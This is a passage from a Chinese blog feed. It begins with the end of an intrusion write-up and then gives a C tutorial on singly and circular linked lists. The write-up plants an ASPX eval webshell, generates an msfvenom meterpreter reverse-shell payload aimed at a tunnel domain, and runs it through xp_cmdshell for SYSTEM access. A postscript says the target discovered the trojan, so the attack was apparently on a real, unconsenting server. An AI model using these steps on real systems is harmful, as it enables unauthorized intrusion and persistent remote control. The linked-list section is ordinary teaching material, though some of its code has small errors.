operator">%</span>^>^&lt;<span class="token operator">%</span>eval<span class="token punctuation">(</span>Request<span class="token punctuation">.</span>Item<span class="token punctuation">[</span><span class="token string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"unsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span>^> > d:\wwwroot\sjk\tedb\shell<span class="token punctuation">.</span>aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>　　使用蚁剑成功连接上webshell<br>　　<img src="https://s1.ax1x.com/2020/10/19/0v7gBQ.png"><br>　　执行whoami后发现是iis apppool\xxx<br>　　发现拥有的权限有，可遍历文件夹包括c盘，文件读写，当前文件夹下不能上传文件<br>　　很幸运的是，我发现在其他文件夹下能成功上传文件，接下来提权</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权　　"></a>提权　　</h3><p>　　这里我用花生壳来建立tcp隧道<br>　　打开kali，查看ip地址<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xZZin.png"><br>　　点击花生壳最右下角的’+’号，创建场景，应用名称随便填，内网主机填kali的ip地址，内网端口随便填，我这里填8080，保存<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xZ2SP.png"><br>　　生成反弹shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp  <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>外网域名 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span>外网端口 -f exe -o install.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/19/0xniqO.png"></p><p>以我的为例，生成反弹shell参考命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp  <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>l347x45481.qicp.vip <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">57945</span> -f exe -o install.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/19/0xupkQ.png"><br>　　生成的木马将会在当前目录下<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xuutJ.png"><br>　　将kali中的install.exe拖到windows中后，成功上传<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xusnf.png"><br>　　回到kali中，依次输入以下命令<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsoleuse exploit/multi/handler  <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp  <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.46.129     //内网主机ip<span class="token builtin class-name">set</span> lport <span class="token number">8080</span>               //内网端口run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　成功开启监听<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xKoRA.png"><br>　　接下来就是运行木马了，这里要注意的是，什么样的权限，无论运行什么程序它赋予的权限也是一样的。如果我直接在蚁剑中执行马子，那么此马子的权限还是iis，而前面通过xp_cmdshell得知权限为system，所以还是要用xp_cmdshell来执行马子<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xGHfO.png"><br>　　session成功建立，如果不成功，有可能是防火墙，杀软在捣乱，谁叫我人品好呢。要是对方安装个杀软，我还要搞免杀，也不至于这么顺利<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xJ9tf.png"><br>　　提权成功<br>　　<img src="https://s1.ax1x.com/2020/10/19/0xJZBn.png"><br>　　剩下的就是后渗透阶段了，永久后门植入，权限维持，域渗透等等。由于本人水平有限，文中难免有错误或遗漏之处，还请谅解，最后感谢你的阅读！</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>　　马子上线的第二天就被对方发现了，这么明显的马名，不被发现也难，错误示范，大家别学我啊(#-.-)<img src="https://s1.ax1x.com/2020/10/19/0xtAwn.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之链表篇</title>
      <link href="2020/34786.html"/>
      <url>2020/34786.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　此篇记录一下本人对链表的理解，重点讲解链表的插入与删除算法，相信大家在学习数据结构的时候，第一篇就是链表。简直是给了我一个下马威。我对应它放弃了多次，早在1年前我就接触了链表，emmm，放弃。始终不甘心，然后等到高考暑假后再次鼓起勇气认识它，好吧，又被它打跑了。终于在前几天重新再来学习链表，功夫不负有心人，彻彻底底的搞懂了链表。<br>　　<a id="more"></a></p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>　　链表由n个结点链组成，第一个结点的存储位置叫做头指针，最后一个结点的指针为“空”(NULL)<br>　　结点：包括数据域和指针域<br>　　头指针：指向链表中第一个结点的地址<br>　　头结点：在单链表的第一个结点前附设的一个结点<br>　　头指针是链表的必要元素，头结点是为了操作的统一和方便而设定的，其数据域一般无意义(可用来保存链表的长度)，头结点可有可无。　　</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><h4 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h4><p>　　<img src="https://s1.ax1x.com/2020/07/16/UDUnHO.png"><br>　　再次强调，请理解头结点和头指针，头指针不是链表的第一个结点，而是指向链表的第一个结点的地址！！</p><p>　　首先定义链表的结点<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 定义链表的结点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span><span class="token comment">//数据域，这里为了方便示例全部采用id值</span>    <span class="token keyword">struct</span> <span class="token class-name">node</span> <span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token comment">//指针域，指向下一个结点的地址</span><span class="token punctuation">&#125;</span>Node<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　然后定义链表的头结点与头指针</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 头结点</span><span class="token comment">// 在定义链表时，习惯性的会定义头结点，以便统一链表结点的插入和删除操作</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LinkList</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span> next<span class="token punctuation">;</span>    <span class="token comment">//头指针（如果链表有头结点，next就指向头结点，没有就指向第一个结点）</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>LinkList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　　上面这段代码，你可能会好奇怎么使用，或者说为什么要这样定义，而不是只要有链表的结点不就完了吗，还要这段代码干嘛，别急后面会用到。</p><h4 id="单链表插入"><a href="#单链表插入" class="headerlink" title="单链表插入"></a>单链表插入</h4><p>　　插入分为两种情况，第一种插入到第一个位置，第二种插入到其他位置。<br>　　<b>第一种情况</b>：插入第一个位置<br>　<img src="https://s1.ax1x.com/2020/07/17/Uy5EPe.gif"><br>　　从图片不难看出，首先将要插入的a结点的next指向头指针，即第一个结点(a<sub>1</sub>)的地址，然后将链表的头指针指向新插入的a结点的地址，就完成了</p><p>　　<b>第二种情况</b>：插入到其他位置<br>　　这里假设插入到3位置<br>　　<img src="https://s1.ax1x.com/2020/07/16/UD27fx.gif"><br>　　让a结点的next指向a<sub>2</sub>的next，然后a<sub>2</sub>的next指向a，就完成了插入。所以，首先要找到要插入的位置的上一个结点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 在指定的位置pos插入元素id</span><span class="token keyword">void</span> <span class="token function">InsertLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span>linkList<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 1.创建空结点并为数据域赋值</span>    Node <span class="token operator">*</span>node <span class="token operator">=</span> <span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>Node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建结点</span>    node<span class="token operator">-></span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    node<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment">// 2.找到要插入位置的结点</span>    <span class="token comment">// 如果插入的是第一个元素</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token operator">-></span>next <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span> <span class="token comment">//重新设置头指针</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">// 通过循环找到要插入的结点位置</span>        Node <span class="token operator">*</span>prev <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// 获取到插入pos前一个结点的地址</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> prev <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            prev <span class="token operator">=</span> prev<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 3.将结点插入并对接前面的结点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>prev <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token comment">//必须先让插入的结点的next获取到前一个结点的next指向的地址空间，</span>            <span class="token comment">//低下这两行代码不能调换顺序</span>            node<span class="token operator">-></span>next <span class="token operator">=</span> prev<span class="token operator">-></span>next<span class="token punctuation">;</span>            prev<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 并不需要单独考虑结点在最后添加的情况</span>        <span class="token comment">// 如果在尾部添加结点。因为在前面，就设置了node->next = NULL</span>        <span class="token comment">// 所以链表的尾结点插入好后下一个空间的地址就是空</span>    <span class="token punctuation">&#125;</span>    linkList<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表初始化"><a href="#单链表初始化" class="headerlink" title="单链表初始化"></a>单链表初始化</h4><p>　　定义初始化函数，此初始化只出现本篇一次，后面的双链表和循环链表将不会出现初始化示例</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 初始化链表</span><span class="token keyword">void</span> <span class="token function">InitLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span> linkList<span class="token punctuation">,</span><span class="token keyword">int</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linkList<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">//初始化链表长度</span>    <span class="token comment">//注意头指针的定义是，即使链表为空，头指针也不为空，这里是本人的代码习惯，所以将头指针设置为空</span>    linkList<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token comment">//初始头指针为空</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">InsertLinkList</span><span class="token punctuation">(</span>linkList<span class="token punctuation">,</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="单链表删除"><a href="#单链表删除" class="headerlink" title="单链表删除"></a>单链表删除</h4><p>　　这里也要分两种情况，第一种情况:删除的位置在第一个，第二种情况:在其他位置删除<br>　　<b>第一种情况</b>:删除的位置在第一个示例<br>　　<img src="https://s1.ax1x.com/2020/07/16/UD5K6P.gif"><br>　　整个的逻辑其实是，直接让头指针指向a<sub>2</sub>即可，然后释放掉a<sub>1</sub>的内存空间即可<br>　　<br>　　<b>第二种情况</b>:在其他位置删除<br>　　假设删除的位置是2，那么需要找到上一个结点，从图片可知让a<sub>1</sub>的next指向a<sub>2</sub>的next，然后释放掉a<sub>2</sub>的空间即可<br>　　<img src="https://s1.ax1x.com/2020/07/17/Uy4UAO.gif"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 在指定位置删除结点</span><span class="token keyword">void</span> <span class="token function">DeleteLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span>linkList<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 1.指向链表的第一个结点</span>    Node <span class="token operator">*</span>node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token comment">// 2.删除的结点为第一个</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//重新设置头指针</span>        <span class="token function">free</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//记得要使用free()，这一步容易忽略</span>        linkList<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 3.获取要删除的结点的前一个结点地址</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    Node <span class="token operator">*</span>delNode <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//要删除的结点的地址</span>    node<span class="token operator">-></span>next <span class="token operator">=</span> delNode<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//重新指向地址</span>    <span class="token function">free</span><span class="token punctuation">(</span>delNode<span class="token punctuation">)</span><span class="token punctuation">;</span>    linkList<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="清空链表"><a href="#清空链表" class="headerlink" title="清空链表"></a>清空链表</h4><p>　　通过循环链表的方式，去清空链表，代码胜千言<br>　　<img src="https://s1.ax1x.com/2020/07/17/UyLrvD.gif"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 清空链表</span><span class="token keyword">void</span> <span class="token function">ClearLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span>linkList<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span>node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">//指向链表的第一个结点</span>    Node <span class="token operator">*</span>nextNode<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        nextNode <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//先记录当前结点的下一个结点以便释放当前结点的内容</span>        <span class="token function">free</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        node <span class="token operator">=</span> nextNode<span class="token punctuation">;</span><span class="token comment">//重新获取结点</span>    <span class="token punctuation">&#125;</span>    linkList<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    linkList<span class="token operator">-></span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="打印链表"><a href="#打印链表" class="headerlink" title="打印链表"></a>打印链表</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">PrintLinkList</span><span class="token punctuation">(</span>LinkList <span class="token operator">*</span>linkList<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span>node <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//获取到链表的第一个结点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>node <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表为空\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> node<span class="token operator">-></span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        node <span class="token operator">=</span> node<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　main函数展示，本篇也只出现这一次，其他类型的链表main内容都大同小异</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    LinkList linkList<span class="token punctuation">;</span>    <span class="token function">InitLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PrintLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">InsertLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">DeleteLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ClearLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">PrintLinkList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>linkList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　　理解了单链表后，那么后面的循环链表和双向链表都大同小异。而从上面的代码中可看出头指针是非常重要的，用起来非常方便。</p><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><h4 id="结构图-1"><a href="#结构图-1" class="headerlink" title="结构图"></a>结构图</h4><p>　　<img src="https://s1.ax1x.com/2020/07/17/UystJ0.png"><br>　　循环链表最大的特点是尾结点的指针域指向第一个结点<br>　　定义循环链表的结点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 循环链表的结点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">CircularNode</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span>                    <span class="token comment">//数据域</span>    <span class="token keyword">struct</span> <span class="token class-name">CircularNode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">//指向下个结点的指针域</span><span class="token punctuation">&#125;</span> CircularNode<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>　　定义循环链表的头结点</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 头结点</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">CircularLinkList</span><span class="token punctuation">&#123;</span>    CircularNode <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">//指向第一个结点的指针，头指针</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> CircularLinkList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="循环链表的插入"><a href="#循环链表的插入" class="headerlink" title="循环链表的插入"></a>循环链表的插入</h4><p>　　循环链表的插入稍微复杂了一点点，有4种情况<br>　　<b>第一种:</b>插入位置在第一个，链表长度不为0<br>　　<b>第二种:</b>插入位置在第一个，链表长度为0<br>　　<b>第三种:</b>插入位置在尾部<br>　　<b>第四种:</b>插入位置在非上述情况</p><p>　　虽然看起来要四种情况，但其实总的来说只有两大种，其他两小种只需要在里面，加一个if判断就能搞定<br>　　<b>第一种</b>:插入位置在第一个，链表长度不为0<br>　　<img src="https://s1.ax1x.com/2020/07/17/Uyfzi4.gif"><br>　　先让a结点的next指向第一个结点的地址，然后让尾结点的next指向a结点的地址，最后头指针指向a结点的地址即可<br>　　<b>第二种:</b>插入位置在第一个，链表长度为0<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgdQHA.gif"><br>　　直接让头指针指向即可<br>　　<b>第三种:</b>插入位置在尾部<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgB3NR.gif"><br>　　<b>第四种:</b>插入位置在非上述情况<br>　　<img src="https://s1.ax1x.com/2020/07/18/Ugrg0g.gif"><br>　　可以看到在非第一个位置插入的情况下，都需要找到前缀结点，先让a结点的next指向前缀结点的next，在让前缀结点的next指向a。如果插入的位置在最后需要更新尾结点指针域</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 在循环链表指定位置插入元素</span><span class="token keyword">void</span> <span class="token function">InsertCircularLinkList</span><span class="token punctuation">(</span>CircularLinkList <span class="token operator">*</span>linkList<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 创建一个空节点</span>    CircularNode <span class="token operator">*</span>node <span class="token operator">=</span> <span class="token punctuation">(</span>CircularNode <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>CircularNode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    node<span class="token operator">-></span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    node<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token comment">// 插入的位置是第一个</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token operator">-></span>next <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token comment">// 如果长度不为0，就要找到链表的最后一个结点</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>linkList<span class="token operator">-></span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            CircularNode <span class="token operator">*</span>lastNode <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> linkList<span class="token operator">-></span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                lastNode <span class="token operator">=</span> lastNode<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// 重新设置尾结点</span>            lastNode<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        linkList<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span> <span class="token comment">//重新设置头结点</span>        linkList<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    CircularNode <span class="token operator">*</span>currNode <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">//找到要插入的上一个结点地址</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pos <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> currNode <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        currNode <span class="token operator">=</span> currNode<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    node<span class="token operator">-></span>next <span class="token operator">=</span> currNode<span class="token operator">-></span>next<span class="token punctuation">;</span>    currNode<span class="token operator">-></span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token comment">// 插入的结点在尾部</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pos <span class="token operator">==</span> linkList<span class="token operator">-></span>length<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        node<span class="token operator">-></span>next <span class="token operator">=</span> linkList<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">//设置尾结点指针域</span>    <span class="token punctuation">&#125;</span>    linkList<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="循环链表的删除"><a href="#循环链表的删除" class="headerlink" title="循环链表的删除"></a>循环链表的删除</h4><p>　　删除分为两种情况<br>　　<b>第一种:</b>在第一个位置删除<br>　　<img src="https://s1.ax1x.com/2020/07/18/Ug2Qte.gif"><br>　　先让尾结点的next指向a<sub>2</sub>，此gif下的一步应该是让头指针指向a<sub>2</sub>，为了方便演示故此顺序不一样，最后free(a<sub>1</sub>)即可</p><p>　　<b>第二种:</b>在其他位置删除<br>　　<img src="https://s1.ax1x.com/2020/07/18/UgRDUO.gif"><br>　　